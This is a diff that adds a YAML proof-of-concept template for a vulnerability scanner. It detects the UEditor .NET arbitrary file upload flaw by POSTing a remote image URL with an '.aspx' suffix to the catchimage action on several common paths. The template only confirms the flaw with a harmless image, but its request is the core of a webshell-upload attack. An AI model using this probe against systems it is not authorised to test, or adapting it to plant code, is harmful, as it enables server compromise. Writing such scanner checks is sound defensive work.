@@ -1,0 +1,48 @@
+id: poc-yaml-ueditor-net-arbitrary-file-upload
+info:
+  name: UEditor Net任意文件上传漏洞
+  severity: high
+  tags:
+  - 文件上传
+  finger: UEditor
+  osprey-id: vb_2018_0035
+variables:
+  r_path: '/lib/ueditor/net/controller.ashx?action=catchimage
+
+    /editor/ueditor/net/controller.ashx?action=catchimage
+
+    /main/ueditor/net/controller.ashx?action=catchimage
+
+    /ueditor/net/controller.ashx?action=catchimage
+
+    /upload/ueditor/net/controller.ashx?action=catchimage
+
+    /includes/ueditor/net/controller.ashx?action=catchimage
+
+    /public/static/ueditor/net/controller.ashx?action=catchimage
+
+    /static/ueditor/net/controller.ashx?action=catchimage'
+requests:
+- method: POST
+  path: '{{.r_path}}'
+  headers:
+    Accept: application/json,image/png,text/javascript, /; q=0.01
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAlM7AOTh0AFhjpae
+  data: '------WebKitFormBoundaryAlM7AOTh0AFhjpae
+
+    Content-Disposition: form-data; name="source[]"
+
+
+    http://www.baidu.com/img/sug_bd.png?.aspx
+
+    ------WebKitFormBoundaryAlM7AOTh0AFhjpae--'
+  expression: 'status_code == 200 && contains(body, "\"SUCCESS\"")
+
+    && contains(body, "\"http://www.baidu.com/img/sug_bd.png")
+
+    && contains(body, "\"source\"")
+
+    && contains(body, "\"list\"")
+
+    '
+transport: http
